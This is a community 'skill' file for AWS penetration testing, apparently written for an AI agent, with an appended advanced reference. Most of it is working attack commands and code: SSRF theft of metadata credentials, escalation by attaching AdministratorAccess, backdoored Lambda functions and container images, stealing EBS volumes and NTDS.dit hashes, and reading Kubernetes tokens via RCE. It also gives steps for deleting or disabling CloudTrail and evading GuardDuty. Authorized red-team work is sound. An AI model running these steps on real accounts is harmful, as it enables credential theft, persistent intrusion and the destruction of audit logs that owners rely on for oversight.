---
title: "AWS Penetration Testing"
description: "This skill should be used when the user asks to 'pentest AWS', 'test AWS security', 'enumerate IAM', 'exploit cloud infrastructure', 'AWS privilege escalation', 'S3 bucket testing..."
category: "devops"
source: "community"
author: "Community"
tags: ["aws", "penetration", "testing"]
date: 2026-03-20
---

# AWS Penetration Testing

## Purpose

Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.

## Inputs/Prerequisites

- AWS CLI configured with credentials
- Valid AWS credentials (even low-privilege)
- Understanding of AWS IAM model
- Python 3, boto3 library
- Tools: Pacu, Prowler, ScoutSuite, SkyArk

## Outputs/Deliverables

- IAM privilege escalation paths
- Extracted credentials and secrets
- Compromised EC2/Lambda/S3 resources
- Persistence mechanisms
- Security audit findings

---

## Essential Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | Shadow Admin discovery | `Import-Module .\SkyArk.ps1` |
| Prowler | Security auditing | `pip install prowler` |
| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |
| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | IAM analysis | `pip install principalmapper` |

---

## Core Workflow

### Step 1: Initial Enumeration

Identify the compromised identity and permissions:

```bash
# Check current identity
aws sts get-caller-identity

# Configure profile
aws configure --profile compromised

# List access keys
aws iam list-access-keys

# Enumerate permissions
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Step 2: IAM Enumeration

```bash
# List all users
aws iam list-users

# List groups for user
aws iam list-groups-for-user --user-name TARGET_USER

# List attached policies
aws iam list-attached-user-policies --user-name TARGET_USER

# List inline policies
aws iam list-user-policies --user-name TARGET_USER

# Get policy details
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# List roles
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Step 3: Metadata SSRF (EC2)

Exploit SSRF to access metadata endpoint (IMDSv1):

```bash
# Access metadata endpoint
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**For IMDSv2 (token required):**

```bash
# Get token first
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Use token for requests
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate Container Credentials:**

```bash
# Read environment for credential path
/proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Access credentials
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Privilege Escalation Techniques

### Shadow Admin Permissions

These permissions are equivalent to administrator:

| Permission | Exploitation |
|------------|--------------|
| `iam:CreateAccessKey` | Create keys for admin user |
| `iam:CreateLoginProfile` | Set password for any user |
| `iam:AttachUserPolicy` | Attach admin policy to self |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:UpdateFunctionCode` | Inject code into Lambda |

### Create Access Key for Another User

```bash
aws iam create-access-key --user-name target_user
```

### Attach Admin Policy

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Add Inline Admin Policy

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Lambda Privilege Escalation

```python
# code.py - Inject into Lambda function
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Update Lambda code
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## S3 Bucket Exploitation

### Bucket Discovery

```bash
# Using bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Common bucket URL patterns
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Bucket Enumeration

```bash
# List buckets (with creds)
aws s3 ls

# List bucket contents
aws s3 ls s3://bucket-name --recursive

# Download all files
aws s3 sync s3://bucket-name ./local-folder
```

### Public Bucket Search

```
https://buckets.grayhatwarfare.com/
```

---

## Lambda Exploitation

```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNCTION_NAME
# Download URL provided in response

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## SSM Command Execution

Systems Manager allows command execution on EC2 instances:

```bash
# List managed instances
aws ssm describe-instance-information

# Execute command
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# Get command output
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

## EC2 Exploitation

### Mount EBS Volume

```bash
# Create snapshot of target volume
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Attach to attacker instance
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Mount and access
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### Shadow Copy Attack (Windows DC)

```bash
# CloudCopy technique
# 1. Create snapshot of DC volume
# 2. Share snapshot with attacker account
# 3. Mount in attacker instance
# 4. Extract NTDS.dit and SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## Console Access from API Keys

Convert CLI credentials to console access:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Generates signin URL for console access
```

---

## Covering Tracks

### Disable CloudTrail

```bash
# Delete trail
aws cloudtrail delete-trail --name trail_name

# Disable global events
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# Disable specific region
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.

---

## Quick Reference

| Task | Command |
|------|---------|
| Get identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List roles | `aws iam list-roles` |
| List buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |

---

## Constraints

**Must:**
- Obtain written authorization before testing
- Document all actions for audit trail
- Test in scope resources only

**Must Not:**
- Modify production data without approval
- Leave persistent backdoors without documentation
- Disable security controls permanently

**Should:**
- Check for IMDSv2 before attempting metadata attacks
- Enumerate thoroughly before exploitation
- Clean up test resources after engagement

---

## Examples

### Example 1: SSRF to Admin

```bash
# 1. Find SSRF vulnerability in web app
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get role name from response
# 3. Extract credentials
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Verify access
aws sts get-caller-identity
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Access Denied on all commands | Enumerate permissions with enumerate-iam |
| Metadata endpoint blocked | Check for IMDSv2, try container metadata |
| GuardDuty alerts | Use Pacu with custom user-agent |
| Expired credentials | Re-fetch from metadata (temp creds rotate) |
| CloudTrail logging actions | Consider disable or log obfuscation |

---

## Additional Resources

For advanced techniques including Lambda/API Gateway exploitation, Secrets Manager & KMS, Container security (ECS/EKS/ECR), RDS/DynamoDB exploitation, VPC lateral movement, and security checklists, see [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.

---

## Reference: Advanced Aws Pentesting

# Advanced AWS Penetration Testing Reference

## Table of Contents
- [Training Resources](#training-resources)
- [Extended Tools Arsenal](#extended-tools-arsenal)
- [AWS API Calls That Return Credentials](#aws-api-calls-that-return-credentials)
- [Lambda & API Gateway](#lambda--api-gateway)
- [Secrets Manager & KMS](#secrets-manager--kms)
- [Container Security (ECS/EKS/ECR)](#container-security-ecseksecr)
- [RDS Database Exploitation](#rds-database-exploitation)
- [DynamoDB Exploitation](#dynamodb-exploitation)
- [VPC Enumeration & Lateral Movement](#vpc-enumeration--lateral-movement)
- [Security Checklist](#security-checklist)

---

## Training Resources

| Resource | Description | URL |
|----------|-------------|-----|
| AWSGoat | Damn Vulnerable AWS Infrastructure | github.com/ine-labs/AWSGoat |
| Cloudgoat | AWS CTF-style scenario | github.com/RhinoSecurityLabs/cloudgoat |
| Flaws | AWS security challenge | flaws.cloud |
| SadCloud | Terraform for vuln AWS | github.com/nccgroup/sadcloud |
| DVCA | Vulnerable Cloud App | medium.com/poka-techblog |

---

## Extended Tools Arsenal

### weirdAAL - AWS Attack Library
```bash
python3 weirdAAL.py -m ec2_describe_instances -t demo
python3 weirdAAL.py -m lambda_get_account_settings -t demo
python3 weirdAAL.py -m lambda_get_function -a 'MY_LAMBDA_FUNCTION','us-west-2'
```

### cloudmapper - AWS Environment Analyzer
```bash
git clone https://github.com/duo-labs/cloudmapper.git
pipenv install --skip-lock
pipenv shell

# Commands
report     # Generate HTML report
iam_report # IAM-specific report
audit      # Check misconfigurations
collect    # Collect account metadata
find_admins # Identify admin users/roles
```

### cloudsplaining - IAM Security Assessment
```bash
pip3 install --user cloudsplaining
cloudsplaining download --profile myawsprofile
cloudsplaining scan --input-file default.json
```

### s3_objects_check - S3 Object Permissions
```bash
git clone https://github.com/nccgroup/s3_objects_check
python s3-objects-check.py -p whitebox-profile -e blackbox-profile
```

### dufflebag - Find EBS Secrets
```bash
# Finds secrets exposed via Amazon EBS's "public" mode
git clone https://github.com/BishopFox/dufflebag
```

---

## AWS API Calls That Return Credentials

| API Call | Description |
|----------|-------------|
| `chime:createapikey` | Create API key |
| `codepipeline:pollforjobs` | Poll for jobs |
| `cognito-identity:getopenidtoken` | Get OpenID token |
| `cognito-identity:getcredentialsforidentity` | Get identity credentials |
| `connect:getfederationtoken` | Get federation token |
| `ecr:getauthorizationtoken` | ECR auth token |
| `gamelift:requestuploadcredentials` | GameLift upload creds |
| `iam:createaccesskey` | Create access key |
| `iam:createloginprofile` | Create login profile |
| `iam:createservicespecificcredential` | Service-specific creds |
| `lightsail:getinstanceaccessdetails` | Instance access details |
| `lightsail:getrelationaldatabasemasteruserpassword` | DB master password |
| `rds-db:connect` | RDS connect |
| `redshift:getclustercredentials` | Redshift credentials |
| `sso:getrolecredentials` | SSO role credentials |
| `sts:assumerole` | Assume role |
| `sts:assumerolewithsaml` | Assume role with SAML |
| `sts:assumerolewithwebidentity` | Web identity assume |
| `sts:getfederationtoken` | Federation token |
| `sts:getsessiontoken` | Session token |

---

## Lambda & API Gateway

### Lambda Enumeration

```bash
# List all lambda functions
aws lambda list-functions

# Get function details and download code
aws lambda get-function --function-name FUNCTION_NAME
wget -O lambda-function.zip "url-from-previous-query"

# Get function policy
aws lambda get-policy --function-name FUNCTION_NAME

# List event source mappings
aws lambda list-event-source-mappings --function-name FUNCTION_NAME

# List Lambda layers (dependencies)
aws lambda list-layers
aws lambda get-layer-version --layer-name NAME --version-number VERSION
```

### API Gateway Enumeration

```bash
# List REST APIs
aws apigateway get-rest-apis

# Get specific API info
aws apigateway get-rest-api --rest-api-id ID

# List endpoints (resources)
aws apigateway get-resources --rest-api-id ID

# Get method info
aws apigateway get-method --rest-api-id ID --resource-id RES_ID --http-method GET

# List API versions (stages)
aws apigateway get-stages --rest-api-id ID

# List API keys
aws apigateway get-api-keys --include-values
```

### Lambda Credential Access

```bash
# Via RCE - get environment variables
https://apigateway/prod/system?cmd=env

# Via SSRF - access runtime API
https://apigateway/prod/example?url=http://localhost:9001/2018-06-01/runtime/invocation/

# Via file read
https://apigateway/prod/system?cmd=file:///proc/self/environ
```

### Lambda Backdooring

```python
# Malicious Lambda code to escalate privileges
import boto3
import json

def handler(event, context):
    iam = boto3.client("iam")
    iam.attach_role_policy(
        RoleName="role_name",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    iam.attach_user_policy(
        UserName="user_name",
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return {'statusCode': 200, 'body': json.dumps("Pwned")}
```

```bash
# Update function with backdoor
aws lambda update-function-code --function-name NAME --zip-file fileb://backdoor.zip

# Invoke backdoored function
curl https://API_ID.execute-api.REGION.amazonaws.com/STAGE/ENDPOINT
```

---

## Secrets Manager & KMS

### Secrets Manager Enumeration

```bash
# List all secrets
aws secretsmanager list-secrets

# Describe specific secret
aws secretsmanager describe-secret --secret-id NAME

# Get resource policy
aws secretsmanager get-resource-policy --secret-id ID

# Retrieve secret value
aws secretsmanager get-secret-value --secret-id ID
```

### KMS Enumeration

```bash
# List KMS keys
aws kms list-keys

# Describe key
aws kms describe-key --key-id ID

# List key policies
aws kms list-key-policies --key-id ID

# Get full policy
aws kms get-key-policy --policy-name NAME --key-id ID
```

### KMS Decryption

```bash
# Decrypt file (key info embedded in ciphertext)
aws kms decrypt --ciphertext-blob fileb://EncryptedFile --output text --query plaintext
```

---

## Container Security (ECS/EKS/ECR)

### ECR Enumeration

```bash
# List repositories
aws ecr describe-repositories

# Get repository policy
aws ecr get-repository-policy --repository-name NAME

# List images
aws ecr list-images --repository-name NAME

# Describe image
aws ecr describe-images --repository-name NAME --image-ids imageTag=TAG
```

### ECS Enumeration

```bash
# List clusters
aws ecs list-clusters

# Describe cluster
aws ecs describe-clusters --cluster NAME

# List services
aws ecs list-services --cluster NAME

# Describe service
aws ecs describe-services --cluster NAME --services SERVICE

# List tasks
aws ecs list-tasks --cluster NAME

# Describe task (shows network info for pivoting)
aws ecs describe-tasks --cluster NAME --tasks TASK_ARN

# List container instances
aws ecs list-container-instances --cluster NAME
```

### EKS Enumeration

```bash
# List EKS clusters
aws eks list-clusters

# Describe cluster
aws eks describe-cluster --name NAME

# List node groups
aws eks list-nodegroups --cluster-name NAME

# Describe node group
aws eks describe-nodegroup --cluster-name NAME --nodegroup-name NODE_NAME

# List Fargate profiles
aws eks list-fargate-profiles --cluster-name NAME
```

### Container Backdooring

```bash
# Authenticate Docker to ECR
aws ecr get-login-password --region REGION | docker login --username AWS --password-stdin ECR_ADDR

# Build backdoored image
docker build -t image_name .

# Tag for ECR
docker tag image_name ECR_ADDR:IMAGE_NAME

# Push to ECR
docker push ECR_ADDR:IMAGE_NAME
```

### EKS Secrets via RCE

```bash
# List Kubernetes secrets
https://website.com/rce.php?cmd=ls /var/run/secrets/kubernetes.io/serviceaccount

# Get service account token
https://website.com/rce.php?cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## RDS Database Exploitation

### RDS Enumeration

```bash
# List RDS clusters
aws rds describe-db-clusters

# List RDS instances
aws rds describe-db-instances
# Check: IAMDatabaseAuthenticationEnabled: false = password auth

# List subnet groups
aws rds describe-db-subnet-groups

# List security groups
aws rds describe-db-security-groups

# List proxies
aws rds describe-db-proxies
```

### Password-Based Access

```bash
mysql -h HOSTNAME -u USERNAME -P PORT -p
```

### IAM-Based Access

```bash
# Generate auth token
TOKEN=$(aws rds generate-db-auth-token \
  --hostname HOSTNAME \
  --port PORT \
  --username USERNAME \
  --region REGION)

# Connect with token
mysql -h HOSTNAME -u USERNAME -P PORT \
  --enable-cleartext-plugin --password=$TOKEN
```

---

## DynamoDB Exploitation

```bash
# List tables
aws dynamodb list-tables

# Scan table contents
aws dynamodb scan --table-name TABLE_NAME | jq -r '.Items[]'

# Query specific items
aws dynamodb query --table-name TABLE_NAME \
  --key-condition-expression "pk = :pk" \
  --expression-attribute-values '{":pk":{"S":"user"}}'
```

---

## VPC Enumeration & Lateral Movement

### VPC Enumeration

```bash
# List VPCs
aws ec2 describe-vpcs

# List subnets
aws ec2 describe-subnets --filters "Name=vpc-id,Values=VPC_ID"

# List route tables
aws ec2 describe-route-tables --filters "Name=vpc-id,Values=VPC_ID"

# List Network ACLs
aws ec2 describe-network-acls

# List VPC peering connections
aws ec2 describe-vpc-peering-connections
```

### Route Table Targets

| Destination | Target | Description |
|-------------|--------|-------------|
| IP | `local` | VPC internal |
| IP | `igw` | Internet Gateway |
| IP | `nat` | NAT Gateway |
| IP | `pcx` | VPC Peering |
| IP | `vpce` | VPC Endpoint |
| IP | `vgw` | VPN Gateway |
| IP | `eni` | Network Interface |

### Lateral Movement via VPC Peering

```bash
# List peering connections
aws ec2 describe-vpc-peering-connections

# List instances in target VPC
aws ec2 describe-instances --filters "Name=vpc-id,Values=VPC_ID"

# List instances in specific subnet
aws ec2 describe-instances --filters "Name=subnet-id,Values=SUBNET_ID"
```

---

## Security Checklist

### Identity and Access Management
- [ ] Avoid use of root account
- [ ] MFA enabled for all IAM users with console access
- [ ] Disable credentials unused for 90+ days
- [ ] Rotate access keys every 90 days
- [ ] Password policy: uppercase, lowercase, symbol, number, 14+ chars
- [ ] No root access keys exist
- [ ] MFA enabled for root account
- [ ] IAM policies attached to groups/roles only

### Logging
- [ ] CloudTrail enabled in all regions
- [ ] CloudTrail log file validation enabled
- [ ] CloudTrail S3 bucket not publicly accessible
- [ ] CloudTrail integrated with CloudWatch Logs
- [ ] AWS Config enabled in all regions
- [ ] CloudTrail logs encrypted with KMS
- [ ] KMS key rotation enabled

### Networking
- [ ] No security groups allow 0.0.0.0/0 to port 22
- [ ] No security groups allow 0.0.0.0/0 to port 3389
- [ ] VPC flow logging enabled
- [ ] Default security group restricts all traffic

### Monitoring
- [ ] Alarm for unauthorized API calls
- [ ] Alarm for console sign-in without MFA
- [ ] Alarm for root account usage
- [ ] Alarm for IAM policy changes
- [ ] Alarm for CloudTrail config changes
- [ ] Alarm for console auth failures
- [ ] Alarm for CMK disabling/deletion
- [ ] Alarm for S3 bucket policy changes
- [ ] Alarm for security group changes
- [ ] Alarm for NACL changes
- [ ] Alarm for VPC changes
